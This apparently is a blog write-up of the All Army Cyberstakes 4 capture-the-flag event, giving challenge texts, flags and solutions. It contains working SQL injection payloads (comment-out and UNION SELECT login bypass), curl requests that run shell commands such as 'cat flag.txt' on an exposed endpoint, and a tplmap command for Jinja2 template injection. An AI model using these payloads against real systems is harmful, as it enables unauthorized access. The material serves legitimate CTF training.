---
layout: post
title: "All Army Cyberstakes 4 April 2020"
categories: CTF
tags: CTF
---

The All Army Cyberstakes 4 took place in April 2020, and it was an event full of exciting challenges that put the participants' cybersecurity skills to the test. The competition featured a range of challenges, each with different levels of difficulty and unique requirements. In this post, we'll take a closer look at some of the challenges that participants had to tackle during the competition.

One of the challenges that participants had to overcome was called "More Out of Site." This challenge required participants to use Firefox Dev Tools to inspect a website and find the JavaScript code responsible for checking if the flag entered by the user was correct. Once they found the code, they were able to identify the correct flag and submit it for points.

Another challenge, "No Escape," required participants to break into a "secure vault" by changing a value in the code and logging in with specific credentials. The challenge also involved a bit of social engineering, as participants had to figure out the correct input to generate the correct hash.

"Blame it on the Temp" was another challenge that required participants to use their hacking skills to identify vulnerabilities in a web application. The challenge involved identifying a template injection vulnerability in a site running on Jinja2 and accessing the admin page to retrieve the flag.

"Cookie Monster" was another challenge that involved hacking into a web application. This time, participants had to exploit a vulnerability in a cookie-generating script to manipulate the value of the cookie and access the admin page.

Overall, the All Army Cyberstakes 4 competition was a great opportunity for participants to test their cybersecurity skills and learn new techniques for identifying and exploiting vulnerabilities in web applications. The challenges were varied and provided a great platform for participants to showcase their skills and knowledge. Whether you're an experienced hacker or just starting in cybersecurity, these challenges offer a fun and engaging way to test your abilities and learn new techniques.

Below are some clever examples
More Out of Site - Points: 10 - (Solves: 367)
Well that was embarrassing... Who knew there was more to a web site then what the browser showed? Not to worry, we're back with a new and improved Javascript version! http://challenge.acictf.com:12077
Use firefox dev tools to inspect site saw http://challenge.acictf.com:12077/flag_checker.js
function check_flag() { var flag = document.forms["flagChecker"]["flag"].value; var submit_button = document.forms["flagChecker"]["submit"]; var status_field = document.getElementById("status"); if (flag == "ACI{client_side_fail_6094fff3}") { submit_button.disabled=false; status_field.innerHTML = ""; } else { submit_button.disabled=true; status_field.innerHTML = "error: does not match flag"; } }

Most Out of Site - Points: 20 - (Solves: 280)
http://challenge.acictf.com:2342/
Inspect the cookies
ACI{cookies_fail_too_d0063673}

No Escape - Points: 60 - (Solves: 36)
Let's see if you can break into our secure vault.
http://challenge.acictf.com:55629/admin

theunbreakablevault@thevault.com

Change this value to one I own

Then Login with creds

Correct password! Flag is: ACI{790b898dfd9058c4} 


No Escape - Points: 60 - (Solves: 36)
Since in-person events are currently banned, some magician we've never heard of is trying to sell us on the idea of a "digital" magic show where the magician logs in using an impossible password. For added assurances, one lucky audience member is able to login and see the hash of the password as proof the password is impossible. We're willing to bet the secret to this magic trick is not all that complicated. http://challenge.acictf.com:5971

Entering ' into user and pass spit out

SELECT username FROM users WHERE username = ''' AND pwHash = '265fda17a34611b1533d8a281ff680dc5791b0ce0a11c25b35e11c8e75685509'

Next I logged in as admin with user and pass admin' --
Which resulted in 
Welcome admin! The "hash" for account 'houdini' is 'Not a hash'.

User: houdini' AND 1=0 UNION ALL SELECT 'houdini', '81dc9bdb52d04dc20036dbd8313ed055'
Pass: 1234

SELECT username FROM users WHERE username = 'houdini' AND 1=0 UNION ALL SELECT 'houdini', '81dc9bdb52d04dc20036dbd8313ed055'' AND pwHash = '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4'

User: houdini'--
Pass: houdini'--
ACI{82eed9231b8c4ce90aea653b6e5}

good authentication systems do password hashing before storing the the password in the database.
so they take the password and do some sha256  or some other hash algorithm (PBKDF2) on the password and store the hash in the database
if the hash is already Not a hash, then you would have to figure out what input would generate that hash?  \<Spolier>, there’s no possible input that will generate a hash with spaces.

DENIED - Points: 75 - (Solves: 52)
http://challenge.acictf.com:62914/index.html#
http://challenge.acictf.com:62914/robots.txt#
http://challenge.acictf.com:62914/maintenance_foo_bar_deadbeef_12345.html#

Inside source
 \<h1>Maintenance\</h1>
        <!--
            Disabled for being insecure... oops!
        <form action="/secret_maintenance_foo_543212345", method="POST">
            <input name="cmd"/>
        </form>-->
        \<p>Result: Run a command! \</p>
There are many ways to solve this
 a simple curl command will solve this challenge
curl -X POST --data cmd=ls http://challenge.acictf.com:62914/secret_maintenance_foo_543212345
curl -X POST --data cmd="cat flag.txt" http://challenge.acictf.com:62914/secret_maintenance_foo_543212345

We can also remove the comments in the HTML on the webpage
This reveals the box we can run commands, this screenshot is after I ran ls
Flag ACI{dd1cfae8b197bdd737f904e466f}

Blame it on the Temp - Points: 150 - (Solves: 3)
http://challenge.acictf.com:21144

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Looks like this site is running Jinja2 also give the path /app/templates

Also by selecting Not-Default as the template we can see a CSRF token that we can change to text
csrf_token=IjhlNjAyYmJmZDM1YmJkOTE3MmRjNzU5YzQwMGU0NWIxYWQ5ZmZkMDMi

python tplmap.py -u 'http://challenge.acictf.com:21144/csrf_token=IjhlNjAyYmJmZDM1YmJkOTE3MmRjNzU5YzQwMGU0NWIxYWQ5ZmZkMDMi/*'



Cookie Monster - Points: 200 - (Solves: 0)
Lets make some yummy cookies! Maybe you can even find some extra tasty ones: http://challenge.acictf.com:8837.
The admin can see the flag on the admin page.You can control the value so select all you want.If you need an endpoint for a callback, postb.in is a useful resource. You could also run a simple server on the competition's shell server using a command like python -m SimpleHTTPServer.

http://challenge.acictf.com:8837/cookie/df419f36-4bce-4bd6-98a2-81377bd6ec86#








